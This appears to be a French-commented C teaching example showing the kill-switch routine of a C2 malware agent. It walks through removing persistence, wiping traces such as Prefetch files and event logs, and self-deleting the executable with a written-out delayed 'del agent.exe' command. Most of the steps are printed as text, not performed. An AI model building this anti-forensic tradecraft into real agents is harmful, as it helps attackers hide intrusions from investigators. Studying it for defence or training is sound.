/*
 * OBJECTIF  : Mecanisme d'auto-destruction et nettoyage pour agent C2
 * PREREQUIS : File API, Registry, Self-deletion
 * COMPILE   : cl example.c /Fe:example.exe
 *
 * Le kill switch permet a l'operateur de detruire proprement l'agent :
 * supprimer la persistance, effacer les traces, et supprimer l'executable.
 */

#include <windows.h>
#include <stdio.h>

void demo_remove_persistence(void) {
    printf("[1] Suppression de la persistance\n\n");

    /* Verifier et lister les cles Run (lecture seule) */
    HKEY hKey;
    LONG ret = RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_READ, &hKey);

    if (ret == ERROR_SUCCESS) {
        printf("    [+] Cle Run accessible\n");
        printf("    En production, le kill switch ferait :\n");
        printf("    RegDeleteValueA(hKey, \"AgentName\")\n");
        RegCloseKey(hKey);
    }

    printf("\n    Nettoyage complet :\n");
    printf("    1. RegDeleteValueA(HKCU\\...\\Run, agent_name)\n");
    printf("    2. schtasks /Delete /TN task_name /F\n");
    printf("    3. sc delete service_name\n");
    printf("    4. Supprimer les fichiers de config\n");
    printf("    5. Restaurer les CLSID COM hijackes\n\n");
}

void demo_trace_cleanup(void) {
    printf("[2] Nettoyage des traces\n\n");

    /* Demontrer l'ecrasement securise de donnees en memoire */
    char sensitive_data[] = "AES_KEY_SUPER_SECRET_12345678";
    printf("    Donnees sensibles avant: %s\n", sensitive_data);

    /* Ecrasement securise avec SecureZeroMemory */
    SecureZeroMemory(sensitive_data, sizeof(sensitive_data));
    printf("    Donnees apres SecureZeroMemory: ");
    int i;
    for (i = 0; i < 8; i++) printf("%02X ", (unsigned char)sensitive_data[i]);
    printf("...\n\n");

    printf("    Traces a nettoyer :\n");
    printf("    - Memoire : SecureZeroMemory sur les buffers\n");
    printf("    - Fichiers temporaires dans %%TEMP%%\n");
    printf("    - Logs eventuels ecrits par l'agent\n");
    printf("    - Prefetch : C:\\Windows\\Prefetch\\AGENT.EXE-*.pf\n");
    printf("    - Registry : cles creees par l'agent\n");
    printf("    - Event logs (si privileges suffisants)\n\n");

    /* Demontrer l'ecrasement de fichier */
    printf("    Ecrasement securise de fichier :\n");
    char tempPath[MAX_PATH], tempFile[MAX_PATH];
    GetTempPathA(sizeof(tempPath), tempPath);
    GetTempFileNameA(tempPath, "c2_", 0, tempFile);

    HANDLE hFile = CreateFileA(tempFile, GENERIC_WRITE, 0,
                               NULL, CREATE_ALWAYS, 0, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        /* Ecrire des donnees sensibles */
        const char* data = "SECRET_CONFIG_DATA_HERE";
        DWORD written;
        WriteFile(hFile, data, (DWORD)strlen(data), &written, NULL);
        printf("    [+] Fichier cree: %s (%lu bytes)\n", tempFile, written);

        /* Ecraser avec des zeros puis des octets aleatoires */
        SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
        char zeros[64] = {0};
        WriteFile(hFile, zeros, written, &written, NULL);
        FlushFileBuffers(hFile);
        printf("    [+] Ecrase avec des zeros\n");

        CloseHandle(hFile);
        DeleteFileA(tempFile);
        printf("    [+] Fichier supprime\n\n");
    }
}

void demo_self_delete(void) {
    printf("[3] Auto-suppression de l'executable\n\n");
    printf("    Probleme : un exe en cours d'execution ne peut pas\n");
    printf("    etre supprime directement (fichier verrouille)\n\n");

    printf("    Solution 1 : cmd.exe /c delayed delete\n");
    printf("    cmd.exe /c ping 127.0.0.1 -n 3 > nul & del agent.exe\n\n");

    printf("    Solution 2 : MoveFileEx avec MOVEFILE_DELAY_UNTIL_REBOOT\n");
    printf("    MoveFileExA(\"agent.exe\", NULL,\n");
    printf("        MOVEFILE_DELAY_UNTIL_REBOOT);\n");
    printf("    -> Supprime au prochain redemarrage\n\n");

    printf("    Solution 3 : Alternate Data Streams (NTFS)\n");
    printf("    1. Renommer agent.exe vers :stream\n");
    printf("    2. Supprimer le fichier principal\n\n");

    printf("    Solution 4 : Self-delete via FILE_FLAG_DELETE_ON_CLOSE\n");
    printf("    1. Re-ouvrir notre exe avec DELETE_ON_CLOSE\n");
    printf("    2. Fermer le handle -> suppression automatique\n\n");

    /* Demo de la solution 4 (conceptuel, on ne supprime pas vraiment) */
    char ourPath[MAX_PATH];
    GetModuleFileNameA(NULL, ourPath, sizeof(ourPath));
    printf("    Notre executable: %s\n", ourPath);
    printf("    (non supprime - demo seulement)\n\n");
}

void demo_kill_switch_protocol(void) {
    printf("[4] Protocole Kill Switch complet\n\n");
    printf("    Commande recue du C2: {\"cmd\":\"kill\"}\n\n");
    printf("    Sequence d'execution :\n");
    printf("    +--------------------------------------------+\n");
    printf("    | 1. Arreter le keylogger                    |\n");
    printf("    | 2. Arreter les threads actifs               |\n");
    printf("    | 3. Nettoyer la memoire (SecureZeroMemory)  |\n");
    printf("    | 4. Supprimer la persistance                |\n");
    printf("    |    - Registry Run keys                     |\n");
    printf("    |    - Scheduled tasks                       |\n");
    printf("    |    - Services                              |\n");
    printf("    | 5. Supprimer les fichiers temporaires      |\n");
    printf("    | 6. Supprimer les logs agent                |\n");
    printf("    | 7. Envoyer confirmation au C2              |\n");
    printf("    | 8. Auto-suppression de l'executable        |\n");
    printf("    | 9. ExitProcess(0)                          |\n");
    printf("    +--------------------------------------------+\n\n");

    printf("    Variantes :\n");
    printf("    - Kill soft : suppression propre avec confirmation\n");
    printf("    - Kill hard : suppression immediate sans nettoyage\n");
    printf("    - Kill timed : auto-destruction apres une date\n");
    printf("    - Kill conditional : si detection suspectee\n\n");

    printf("    Securite :\n");
    printf("    - La commande kill doit etre authentifiee\n");
    printf("    - Eviter qu'un defenseur puisse envoyer un faux kill\n");
    printf("    - Signature HMAC sur la commande\n\n");
}

int main(void) {
    printf("[*] Demo : Kill Switch Agent C2\n");
    printf("[*] ==========================================\n\n");
    demo_remove_persistence();
    demo_trace_cleanup();
    demo_self_delete();
    demo_kill_switch_protocol();
    printf("[+] Exemple termine avec succes\n");
    return 0;
}
